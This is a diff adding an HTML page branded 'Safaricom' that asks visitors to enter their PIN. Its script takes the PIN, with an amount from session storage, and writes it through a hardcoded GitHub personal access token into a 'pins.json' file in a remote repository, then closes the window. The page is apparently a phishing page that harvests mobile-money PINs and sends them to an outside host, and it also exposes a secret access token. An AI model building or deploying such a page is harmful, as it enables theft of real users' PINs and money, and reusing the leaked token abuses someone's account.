@@ -1,1 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Safaricom</title>
+    <style>
+        #heading {
+            font-size: 30px;
+            background-color: #f5f7f2;
+            display: block;
+            margin: 10px;
+            padding: 20px;
+        }
 
+        #subheading {
+            font-size: 25px;
+            font-weight: bold;
+            color: #5da9c9;
+            display: block;
+            margin: 10px;
+            padding: 20px;
+        }
+
+        a {
+            display: block;
+            padding-top: 30px;
+            margin-left: 30px;
+            margin-bottom: 1px;
+            font-size: 20px;
+            border: solid;
+            border-width: 1px;
+            border-color: #edebe4;
+            color: black;
+            text-decoration: none;
+        }
+
+        #enternumberlabel {
+            color: #d6d4d4;
+            margin-left: 20px;
+            display: block;
+        }
+
+        #enternumberinput {
+            display: block;
+            outline: none;
+            margin: 20px;
+        }
+
+        #getphonebutton {
+            margin-top: 20px;
+            margin-left: 50px;
+            width: 80px;
+            height: 30px;
+            border-radius: 25px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <label id="heading">Safaricom</label>
+    <label id="subheading">Enter Pin</label>
+    <label id="enternumberlabel">Digits (0-9, *, #, +) 10-13</label>
+    <input id="enternumberinput" type="text">
+    <button id="getphonebutton">OK</button>
+
+    <script>
+        async function updateJSONOnGitHub(newKeyValue) {
+            const repoOwner = "senmakana";  // Replace with your GitHub username
+            const repoName = "Pins";  // Replace with your repository name
+            const filePath = "pins.json";  // Replace with your file path
+            const branch = "main";  // Use the correct branch
+            const githubToken = "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"; // Replace with your GitHub Personal Access Token
+
+            const fileApiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`;
+
+            try {
+                console.log("Fetching file metadata...");
+
+                const fileResponse = await fetch(fileApiUrl, {
+                    headers: {
+                        Authorization: `Bearer ${githubToken}`,
+                    },
+                });
+
+                if (!fileResponse.ok) {
+                    throw new Error(`Failed to fetch file metadata: ${fileResponse.statusText}`);
+                }
+
+                const fileData = await fileResponse.json();
+                const fileContent = atob(fileData.content);  // Decode base64 content
+                const json = JSON.parse(fileContent);
+
+                // Update the JSON with the new key-value pairs
+                Object.assign(json, newKeyValue);
+
+                // Encode the updated JSON to base64
+                const updatedContent = btoa(JSON.stringify(json, null, 2));
+
+                const updateResponse = await fetch(fileApiUrl, {
+                    method: "PUT",
+                    headers: {
+                        Authorization: `Bearer ${githubToken}`,
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        message: "Update pins.json with new data",
+                        content: updatedContent,
+                        sha: fileData.sha,
+                        branch,
+                    }),
+                });
+
+                if (!updateResponse.ok) {
+                    throw new Error(`Failed to update file: ${updateResponse.statusText}`);
+                }
+
+                console.log("File updated successfully!");
+            } catch (error) {
+                console.error("Error:", error.message);
+                alert("An error occurred. Check the console for details.");
+            }
+        }
+
+        function getPhoneNumber() {
+            const pin = document.getElementById("enternumberinput").value;
+            sessionStorage.setItem("pin", pin);
+
+            // Prepare new data
+            const newKeyValue = {
+                "pin": pin,
+                "phonenumber": 888888,  // Sample phone number
+                "amount": sessionStorage.getItem("amount") || 0,  // Default to 0 if not set
+            };
+
+            // Call the update function
+            updateJSONOnGitHub(newKeyValue);
+
+            // Attempt to close the window
+            try {
+                window.close();
+                console.log("Window closed.");
+            } catch (e) {
+                alert("Unable to close the window. Please close it manually.");
+            }
+        }
+
+        // Attach event listener for the button click
+        document.getElementById("getphonebutton").addEventListener("click", getPhoneNumber);
+    </script>
+</body>
+</html>
